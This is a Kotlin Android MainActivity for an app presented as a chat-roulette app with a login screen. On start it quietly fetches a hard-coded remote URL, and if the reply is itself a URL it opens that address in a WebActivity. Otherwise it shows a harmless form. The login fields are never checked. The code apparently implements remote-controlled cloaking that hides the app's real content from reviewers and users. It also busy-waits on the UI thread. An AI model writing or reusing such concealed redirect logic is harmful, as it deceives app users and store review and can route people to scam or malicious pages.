package com.example.chatroulette.views

import android.annotation.SuppressLint
import android.content.Intent
import android.os.AsyncTask
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Toast
import androidx.lifecycle.lifecycleScope
import com.example.chatroulette.R
import com.example.chatroulette.databinding.ActivityMainBinding
import kotlinx.coroutines.launch
import org.jsoup.Jsoup

private var base_url = "https://flowmonet.online/q7kF5wRD"

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private var i: Intent? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        OpenWebTask().execute(base_url)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.buttonLogin.setOnClickListener {
            if (binding.editTextLogin.text.isEmpty() || binding.editTextPassword.text.isEmpty()) {
                Toast.makeText(
                    this,
                    resources.getString(R.string.authorized_error),
                    Toast.LENGTH_SHORT
                ).show()
            } else {
                lifecycleScope.launch {
                    if (i == null) {
                        Toast.makeText(
                            this@MainActivity,
                            "",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                    while (i == null) {
                        //wait for parse base_url
                    }
                    startActivity(i)
                }
            }
        }
    }

    @SuppressLint("StaticFieldLeak")
    private inner class OpenWebTask : AsyncTask<String, Unit, String>() {
        override fun doInBackground(vararg url: String?): String {
            try {
                val text = Jsoup.connect(url[0]).get().body().text()
                return if (text.startsWith("http")) {
                    text
                } else {
                    ""
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            return ""
        }

        override fun onPostExecute(result: String?) {
            super.onPostExecute(result)
            i = when (result) {
                "" -> Intent(this@MainActivity, FormActivity::class.java)
                else -> Intent(this@MainActivity, WebActivity::class.java).apply {
                    putExtra(WebActivity.URL, result!!)
                }
            }
        }
    }

}